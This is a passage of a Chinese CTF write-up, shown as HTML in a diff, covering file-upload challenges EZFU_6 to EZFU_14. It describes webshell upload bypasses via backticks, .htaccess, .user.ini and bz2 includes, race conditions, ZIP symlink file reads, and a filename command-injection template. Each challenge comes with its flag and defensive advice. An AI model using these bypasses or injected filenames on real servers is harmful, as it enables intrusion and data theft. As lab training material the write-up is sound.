+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：注意 payload 中变量要用单引号，双引号在 multipart 上传时可能被转义导致命令无法传入&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_6&#34;&gt;EZFU_6
+&lt;/h3&gt;&lt;p&gt;在 EZFU_5 基础上加了&lt;strong&gt;危险函数检测&lt;/strong&gt;。常见命令执行函数 等常见命令执行函数全被拦截&lt;/p&gt;
+&lt;p&gt;但遗漏了 PHP 的&lt;strong&gt;反引号运算符&lt;/strong&gt;。反引号在 PHP 中等价于 命令执行函数，但它是运算符不是函数名，不被关键词黑名单匹配。使用 &lt;code&gt;[?= &lt;/code&gt; + 反引号构造 payload 上传成功&lt;/p&gt;
+&lt;p&gt;读取环境变量获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{e0299c86-2e7c-4f50-a94e-f7e935190f8d}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：防御时不能只靠函数名黑名单，还应禁用反引号，或在 php.ini 中设置 &lt;code&gt;disable_functions&lt;/code&gt; 彻底禁用危险函数&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_7&#34;&gt;EZFU_7
+&lt;/h3&gt;&lt;p&gt;封了 &lt;code&gt;.phtml&lt;/code&gt;，但 &lt;code&gt;.php7&lt;/code&gt; 和 &lt;code&gt;.phar&lt;/code&gt; 可以上传，且文件名保留原始名称。&lt;code&gt;.htaccess&lt;/code&gt; 也可以上传&lt;/p&gt;
+&lt;p&gt;两步配合：先上传 &lt;code&gt;.htaccess&lt;/code&gt; 设置 &lt;code&gt;AddType application/x-httpd-php .php7&lt;/code&gt;，再上传 webshell 的 &lt;code&gt;.php7&lt;/code&gt; 文件。访问 webshell 读取环境变量获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{01767fde-9e9b-4438-9555-b7f1dfd30d7b}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：文件名未随机化是关键漏洞，允许上传 &lt;code&gt;.htaccess&lt;/code&gt; 修改 Apache 解析规则&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_8&#34;&gt;EZFU_8
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;.htaccess&lt;/code&gt; 不生效（Apache &lt;code&gt;AllowOverride None&lt;/code&gt;），但 uploads 目录下有 &lt;code&gt;index.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;突破口是 &lt;strong&gt;&lt;code&gt;.user.ini&lt;/code&gt;&lt;/strong&gt;。它是 PHP-FPM 的用户级配置文件，不受 Apache &lt;code&gt;AllowOverride&lt;/code&gt; 限制。利用 &lt;code&gt;auto_prepend_file&lt;/code&gt; 指令让 PHP 在执行任何文件前先包含指定文件&lt;/p&gt;
+&lt;p&gt;先上传带 PHP 代码的 GIF 文件作为 webshell，再上传 &lt;code&gt;.user.ini&lt;/code&gt; 设置 &lt;code&gt;auto_prepend_file&lt;/code&gt; 指向该 GIF。访问 &lt;code&gt;index.php&lt;/code&gt; 触发包含执行，获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{c5547a89-8077-43e9-8916-8fc129ba423b}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：&lt;code&gt;.htaccess&lt;/code&gt; 由 Apache 读取受 &lt;code&gt;AllowOverride&lt;/code&gt; 控制，&lt;code&gt;.user.ini&lt;/code&gt; 由 PHP-FPM 自身读取不经过 Apache。防御时应禁止上传 &lt;code&gt;.user.ini&lt;/code&gt; 和 &lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_9&#34;&gt;EZFU_9
+&lt;/h3&gt;&lt;p&gt;综合题，涉及&lt;strong&gt;信息泄露 → 登录认证 → 文件上传&lt;/strong&gt;三个环节&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第一步：源码泄露&lt;/strong&gt;。&lt;code&gt;login.php&lt;/code&gt; 的 &lt;code&gt;?doc=&lt;/code&gt; 参数存在目录穿越，用 &lt;code&gt;../&lt;/code&gt; 读取 PHP 源码&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第二步：获取密码&lt;/strong&gt;。源码中密码藏在 &lt;code&gt;/etc/passwd&lt;/code&gt; 的 GECOS 字段（&lt;code&gt;pass=HHEFasNdUZMc&lt;/code&gt;），用目录穿越读取&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第三步：登录后台&lt;/strong&gt;。Dashboard 有 &lt;code&gt;.bz2&lt;/code&gt; 备份恢复功能，解压后文件名 = 上传文件名去掉 &lt;code&gt;.bz2&lt;/code&gt; 后缀&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;第四步：构造恶意 bz2&lt;/strong&gt;。用 Python 的 &lt;code&gt;bz2.compress()&lt;/code&gt; 创建包含 PHP 代码的 bzip2 文件，命名为 &lt;code&gt;shell.php.bz2&lt;/code&gt; 上传，解压后写入 &lt;code&gt;uploads/shell.php&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;访问 webshell 获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{28632ee2-2849-449b-9cea-db6e9d8e4584}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：多漏洞组合利用，文件名处理是关键——去掉 &lt;code&gt;.bz2&lt;/code&gt; 后缀作为写入路径&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_10&#34;&gt;EZFU_10
+&lt;/h3&gt;&lt;p&gt;&lt;code&gt;login.php&lt;/code&gt; 弱口令 &lt;code&gt;admin&lt;/code&gt; / &lt;code&gt;123456&lt;/code&gt; 直接登录&lt;/p&gt;
+&lt;p&gt;Dashboard 备份恢复功能使用 &lt;code&gt;include()&lt;/code&gt; 直接包含上传的 &lt;code&gt;.bz2&lt;/code&gt; 文件。bz2 压缩数据中的 PHP 代码会被解析执行&lt;/p&gt;
+&lt;p&gt;但因为上传是 POST 请求，&lt;code&gt;$_GET&lt;/code&gt; 参数不可用。需要用 文件写入函数 先写入持久化 webshell，再通过 GET 请求触发&lt;/p&gt;
+&lt;p&gt;用 Python 的 &lt;code&gt;bz2.compress()&lt;/code&gt; 创建包含写文件逻辑的 payload，命名为 &lt;code&gt;writer.bz2&lt;/code&gt; 上传。服务器 &lt;code&gt;include()&lt;/code&gt; 执行后将 webshell 写入 &lt;code&gt;uploads/rce.php&lt;/code&gt;，访问获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{fefcc82a-45f7-49fa-bcbb-d3f0538bb502}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：弱口令是第一个突破口，&lt;code&gt;include()&lt;/code&gt; 直接包含上传文件是第二个，POST 时 &lt;code&gt;$_GET&lt;/code&gt; 不可用需要持久化是第三个&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_11&#34;&gt;EZFU_11
+&lt;/h3&gt;&lt;p&gt;PHP 文件可以直接上传（无扩展名黑名单），但 uploads 目录下 &lt;code&gt;.htaccess&lt;/code&gt; 阻止 PHP 执行，且每次上传后自动恢复原始 &lt;code&gt;.htaccess&lt;/code&gt;&lt;/p&gt;
+&lt;p&gt;利用 &lt;code&gt;.htaccess&lt;/code&gt; 覆盖机制：先上传自定义 &lt;code&gt;.htaccess&lt;/code&gt;（使用 &lt;code&gt;RemoveType&lt;/code&gt; 和 &lt;code&gt;RemoveHandler&lt;/code&gt; 移除 PHP 解析限制），再立刻上传 PHP webshell，在服务器恢复原始 &lt;code&gt;.htaccess&lt;/code&gt; 前访问&lt;/p&gt;
+&lt;p&gt;读取 &lt;code&gt;/flag&lt;/code&gt; 文件获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;FLAG=flag{a325e29e-fc14-41d2-864f-1a1d79d8269b}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这是竞态条件利用——必须在服务器恢复原始 &lt;code&gt;.htaccess&lt;/code&gt; 之前快速完成上传和访问。flag 位于 &lt;code&gt;/flag&lt;/code&gt; 文件而非环境变量中&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_12&#34;&gt;EZFU_12
+&lt;/h3&gt;&lt;p&gt;访问首页，文件上传表单，PHP 8.2.30。文件名会被加上 UUID 前缀进行随机化&lt;/p&gt;
+&lt;p&gt;测试发现 PHP 文件可以直接上传，且上传后代码会立刻执行。但大约 2 秒后文件会被自动删除——这是一个&lt;strong&gt;竞态条件&lt;/strong&gt;漏洞&lt;/p&gt;
+&lt;p&gt;解题思路：&lt;/p&gt;
+&lt;ol&gt;
+&lt;li&gt;构造一个读取系统信息的 PHP 脚本（用 shell_exec 函数执行 env 或 cat 命令）&lt;/li&gt;
+&lt;li&gt;通过 curl 上传该脚本，服务端返回带 UUID 的文件路径&lt;/li&gt;
+&lt;li&gt;在文件被删除前立刻用 curl 访问该路径获取输出&lt;/li&gt;
+&lt;/ol&gt;
+&lt;p&gt;由于文件存活时间极短，需要在一次请求中完成上传和访问。用 shell 脚本先上传获取 URL，再立刻访问：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 第一步：上传包含命令执行代码的 PHP 文件
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 第二步：立刻访问返回的文件路径
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;# 输出中包含环境变量或文件内容
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;实际操作中，上传读取环境变量的脚本后立刻访问，获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{2630f931-6b0a-45db-915f-a1d4d055c4dc}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题的核心是竞态条件——PHP 文件上传后立刻可执行，但约 2 秒后被清理脚本删除。攻击者必须在这 2 秒窗口内完成上传和访问。防御时应在校验通过后再写入磁盘，或者在上传时就阻止含危险代码的文件，而非事后清理&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_13&#34;&gt;EZFU_13
+&lt;/h3&gt;&lt;p&gt;访问首页，是一个&amp;quot;在线 ZIP 解压中心&amp;quot;，上传 ZIP 文件后自动解压并提供下载链接&lt;/p&gt;
+&lt;p&gt;页面 HTML 注释中泄露了提示：flag 位于 &lt;code&gt;/C000000quer.txt&lt;/code&gt;。但下载接口的 &lt;code&gt;file&lt;/code&gt; 参数做了路径穿越过滤，无法直接读取系统文件&lt;/p&gt;
+&lt;p&gt;突破口是 &lt;strong&gt;ZIP 符号链接攻击&lt;/strong&gt;。ZIP 格式支持存储 Unix 符号链接，解压时如果服务端不做校验，会创建指向任意路径的符号链接。通过下载接口访问该符号链接时，服务端会跟随链接读取目标文件内容&lt;/p&gt;
+&lt;p&gt;用 Python 构造包含符号链接的 ZIP 文件，将链接目标设为 &lt;code&gt;/C000000quer.txt&lt;/code&gt;，链接名称设为 &lt;code&gt;flag_link&lt;/code&gt;。上传后解压生成符号链接，通过下载接口访问即可读取 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;download&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;php&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;?&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;id&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;任务&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;ID&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;flag_link&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;输出：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{a8e7c643-b427-4091-8e7a-1e71f23dbd37}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;构造恶意 ZIP 的 Python 代码思路：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;使用 zipfile 模块创建 ZipInfo 对象
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;设置 create_system = 3（Unix）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;设置 external_attr 为符号链接权限（0o120777 &amp;lt;&amp;lt; 16）
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;写入链接目标路径作为文件内容
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题考的是 ZIP 符号链接攻击。ZIP 格式可以存储符号链接，如果解压时不检查链接目标，就会创建指向系统任意文件的符号链接。配合下载接口，可以读取系统上的敏感文件。防御时解压后应检查文件类型，拒绝符号链接或限制链接目标路径&lt;/p&gt;
+&lt;h3 id=&#34;ezfu_14&#34;&gt;EZFU_14
+&lt;/h3&gt;&lt;p&gt;访问首页，是一个&amp;quot;在线图片检测中心&amp;quot;，上传 JPG 图片后自动生成检测报告&lt;/p&gt;
+&lt;p&gt;页面 HTML 注释泄露提示：源码备份存在。访问 &lt;code&gt;index.php.bak&lt;/code&gt; 获取源码&lt;/p&gt;
+&lt;p&gt;源码中发现关键漏洞——命令注入：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-gdscript3&#34; data-lang=&#34;gdscript3&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;uploads/&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;uploadedName&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;n&#34;&gt;exec&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;file &amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;file&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;.&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34; 2&amp;gt;&amp;amp;1&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;details&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;$&lt;/span&gt;&lt;span class=&#34;n&#34;&gt;status&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;文件名未经任何过滤直接拼接进 shell 命令。后端只校验扩展名为 &lt;code&gt;.jpg&lt;/code&gt;，但文件名中可以包含 shell 元字符&lt;/p&gt;
+&lt;p&gt;利用分号 &lt;code&gt;;&lt;/code&gt; 作为命令分隔符注入命令。文件名格式为 &lt;code&gt;x.jpg;要执行的命令;#.jpg&lt;/code&gt;，其中：&lt;/p&gt;
+&lt;ul&gt;
+&lt;li&gt;&lt;code&gt;x.jpg&lt;/code&gt; 满足扩展名校验&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;;&lt;/code&gt; 分隔出新命令&lt;/li&gt;
+&lt;li&gt;&lt;code&gt;#&lt;/code&gt; 注释掉后面的 &lt;code&gt;.jpg 2&amp;gt;&amp;amp;1&lt;/code&gt;&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;通过注入 &lt;code&gt;ls -la&lt;/code&gt; 发现目录下有 &lt;code&gt;pigeon_cat.php&lt;/code&gt; 文件，读取该文件获得 flag：&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-fallback&#34; data-lang=&#34;fallback&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;flag{2f3dfdf9-33c7-48e5-99fe-91973754ef8e}
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;&lt;strong&gt;复盘&lt;/strong&gt;：这题考的是命令注入。&lt;code&gt;exec()&lt;/code&gt; 函数直接拼接用户输入的文件名到 shell 命令中，没有任何过滤。后端只校验了文件扩展名，没有对文件名内容做安全检查。防御时应使用 &lt;code&gt;escapeshellarg()&lt;/code&gt; 对用户输入进行转义，或者使用白名单只允许字母数字和点号&lt;/p&gt;
+&lt;h2 id=&#34;ezsql&#34;&gt;EZSQL
 &lt;/h2&gt;&lt;h3 id=&#34;ezsql-1&#34;&gt;EZSQL
 &lt;/h3&gt;&lt;h3 id=&#34;ezsql_1&#34;&gt;EZSQL_1
 &lt;/h3&gt;&lt;h3 id=&#34;ezsql_2&#34;&gt;EZSQL_2
